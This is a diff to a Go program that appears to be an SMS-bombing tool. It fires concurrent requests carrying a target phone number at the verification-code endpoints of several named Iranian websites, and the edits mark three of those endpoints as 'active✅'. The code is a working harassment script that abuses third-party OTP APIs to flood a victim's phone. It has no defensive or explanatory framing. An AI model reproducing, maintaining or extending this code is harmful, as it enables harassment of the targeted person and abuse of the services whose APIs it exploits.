@@ -219,7 +219,7 @@ func main() {
 		}, ch)  // error site: secure connection
 		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
 			"phone": phone,
-		}, ch)  // edit :4/22/2025
+		}, ch)    //active✅
  //delete site : not box phone number
 		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
 			"phone=": phone,
@@ -230,10 +230,10 @@ func main() {
 		}, ch)  // idon't know ???
 		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)  // edit :4/22/2025
+		}, ch)    //active✅
 		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
 			"username": phone,
-		}, ch)  // edit :4/22/2025
+		}, ch)    //active✅
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
